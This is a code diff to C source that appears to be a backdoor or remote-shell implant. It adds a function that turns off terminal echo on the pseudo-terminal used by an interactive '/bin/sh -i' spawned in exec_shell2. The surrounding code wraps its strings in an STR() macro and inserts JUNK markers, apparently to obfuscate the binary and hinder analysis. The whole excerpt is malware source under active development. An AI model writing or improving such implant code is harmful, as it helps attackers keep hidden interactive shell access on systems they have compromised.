@@ -108,6 +108,19 @@ int hello(param_t *command)
 	return 0;
 }
 
+static int disable_echo(int slave_fd) {
+	struct termios tty;
+
+	if (ioctl(slave_fd, TCGETS, &tty) == -1) {
+		logger(STR("ioctl TGETATTR failed\n"));
+		return -1;
+	} JUNK;
+
+	tty.c_lflag &= ~ECHO;
+
+	return ioctl(slave_fd, TCSETS, &tty);
+}
+
 int exec_shell2(param_t *command)
 {
 	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
@@ -129,6 +142,11 @@ int exec_shell2(param_t *command)
 			logger(STR("open slave failed\n"));
 			exit(1);
 		} JUNK;
+
+		if (disable_echo(slave_fd) == -1) {
+			logger(STR("disable_echo failed\n"));
+			exit(1);
+		}
 
 		if (prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) {
 			logger(STR("prctl failed\n"));
@@ -273,6 +291,8 @@ void client_event(event_t *self, uint32_t events) {
 			logger(STR("fd is blocking\n"));
 			return;
 		}
+
+		/* prompt */
 
 		ssize_t ret = read(self->fd, buf, sizeof(buf) - 1);
 
